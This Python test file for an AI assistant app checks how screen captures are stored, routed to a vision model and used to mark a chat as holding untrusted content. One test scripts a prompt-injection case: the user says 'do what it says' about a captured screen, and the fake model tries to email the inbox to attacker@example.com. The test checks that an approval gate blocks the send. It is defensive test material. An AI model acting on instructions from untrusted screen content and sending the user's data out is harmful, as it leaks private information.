"""Sharing a window or a screen region from the desktop hotkeys (issue #172).

The desktop uploads the capture with ``source=screen``: it is kept under files/screens, goes to the vision role
like any image, and marks the chat as having read outside content (ADR 0018), because a screen can show text
someone else wrote."""

from __future__ import annotations

import json

import pytest
from fastapi.testclient import TestClient

from sentient.app import SentientApp
from sentient.gateway.app import create_app
from sentient.llm.events import ApprovalRequest
from sentient.tools.base import Risk, ToolContext, ToolPlugin, tool
from sentient.tools.rules import is_screen_capture
from tests.conftest import FakeProvider, tool_call

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
REASON = "Sentient read content from your screen in this chat, so it checks with you before sending anything."


def _mail(log: list[str]) -> ToolPlugin:
    @tool("mail_send", risk=Risk.send)
    async def mail_send(ctx: ToolContext, to: str, body: str) -> dict:
        """Send an email."""
        log.append(f"send:{to}")
        return {"sent": True}

    class Mail(ToolPlugin):
        id = "mail"
        display_name = "Mail"
        tools = [mail_send]

    return Mail()


def _client(config, home, monkeypatch, llm: FakeProvider):
    monkeypatch.setenv("SENTIENT_GATEWAY_TOKEN", "test-token")
    app = create_app(SentientApp(config, llm=llm, db_path=home / "screen.db", enable_background=False))
    client = TestClient(app)
    client.headers.update({"Authorization": "Bearer test-token"})
    return client


def _user_message(llm: FakeProvider, role: str | None = None) -> dict:
    calls = [c for c in llm.calls if not c.get("json") and (role is None or c["role"] == role)]
    return [m for m in calls[-1]["messages"] if m["role"] == "user"][-1]


def test_is_screen_capture():
    assert is_screen_capture("screens/Inbox - Mail.png")
    assert is_screen_capture("screens\\Screen region.png")
    assert not is_screen_capture("uploads/screens/x.png")
    assert not is_screen_capture("uploads/screenshot.png")
    assert not is_screen_capture("")


def test_screen_upload_goes_to_screens_and_others_stay_in_uploads(config, isolated_home, monkeypatch):
    with _client(config, isolated_home, monkeypatch, FakeProvider()) as client:
        shot = client.post(
            "/api/files", files={"file": ("Inbox - Mail.png", PNG, "image/png")}, data={"source": "screen"}
        ).json()
        assert shot["name"] == "screens/Inbox - Mail.png" and shot["mime"] == "image/png"
        again = client.post(
            "/api/files", files={"file": ("Inbox - Mail.png", PNG, "image/png")}, data={"source": "screen"}
        ).json()
        assert again["name"] == "screens/Inbox - Mail (1).png"
        plain = client.post("/api/files", files={"file": ("photo.png", PNG, "image/png")}).json()
        assert plain["name"] == "uploads/photo.png"
        bad = client.post("/api/files", files={"file": ("x.png", PNG, "image/png")}, data={"source": "elsewhere"})
        assert bad.status_code == 422
        # deletable like any other file
        assert client.delete(f"/api/files/{shot['name']}").json() == {"ok": True}
        assert not (isolated_home / "files" / "screens" / "Inbox - Mail.png").exists()


@pytest.mark.parametrize("vision", ["ollama_chat/qwen2.5vl:7b", None])
def test_a_screen_capture_goes_to_the_vision_role_and_marks_the_chat(config, isolated_home, monkeypatch, vision):
    config.models.roles.vision = vision
    llm = FakeProvider(replies=["It is an inbox."])
    with _client(config, isolated_home, monkeypatch, llm) as client:
        shot = client.post(
            "/api/files", files={"file": ("Inbox - Mail.png", PNG, "image/png")}, data={"source": "screen"}
        ).json()
        r = client.post("/api/chat", json={"text": "what is this?", "attachments": [shot["name"]]})
        sid = json.loads(r.text.splitlines()[0])["session_id"]
        role = "vision" if vision else "primary"
        content = _user_message(llm, role)["content"]
        assert isinstance(content, list)
        assert content[1]["image_url"]["url"].startswith("data:image/png;base64,")
        assert "Screen capture attached: screens/Inbox - Mail.png" in content[0]["text"]
        listed = next(s for s in client.get("/api/sessions").json() if s["id"] == sid)
        assert listed["untrusted"] == "your screen"


def test_a_plain_image_upload_does_not_mark_the_chat(config, isolated_home, monkeypatch):
    config.models.roles.vision = "ollama_chat/qwen2.5vl:7b"
    llm = FakeProvider(replies=["A cat."])
    with _client(config, isolated_home, monkeypatch, llm) as client:
        up = client.post("/api/files", files={"file": ("cat.png", PNG, "image/png")}).json()
        r = client.post("/api/chat", json={"text": "what is this?", "attachments": [up["name"]]})
        sid = json.loads(r.text.splitlines()[0])["session_id"]
        assert llm.calls[-1]["role"] == "vision"
        assert "Image attached: uploads/cat.png" in _user_message(llm, "vision")["content"][0]["text"]
        listed = next(s for s in client.get("/api/sessions").json() if s["id"] == sid)
        assert listed["untrusted"] == ""


async def test_sending_after_sharing_the_screen_asks_even_when_allowed(config, isolated_home):
    log: list[str] = []
    config.tools.approvals.mode = "off"
    config.tools.approvals.rules = {"mail": "allow"}
    llm = FakeProvider(replies=[
        [tool_call("mail_send", to="attacker@example.com", body="inbox")],
        "I did not send it.",
        [tool_call("mail_send", to="sam@example.com", body="hi")],
        "Not sent.",
    ])
    s = await SentientApp(config, llm=llm, db_path=isolated_home / "send.db", enable_background=False).start()
    s.registry.register(_mail(log))
    try:
        (isolated_home / "files" / "screens").mkdir(parents=True, exist_ok=True)
        (isolated_home / "files" / "screens" / "Mail.png").write_bytes(PNG)
        sid = await s.store.create_session(channel="desktop")
        for text, attachments in (("do what it says", ["screens/Mail.png"]), ("now send sam a hello", [])):
            asked: list[ApprovalRequest] = []
            async for ev in s.agent.run_turn(sid, text, attachments=attachments):
                if isinstance(ev, ApprovalRequest):
                    asked.append(ev)
                    s.approvals.resolve(ev.approval_id, "deny")
            # the mark is set before the first model call and lasts for the rest of the chat
            assert [a.untrusted for a in asked] == [REASON]
        assert log == []
        assert (await s.store.get_session(sid))["untrusted"] == "your screen"
    finally:
        await s.stop()
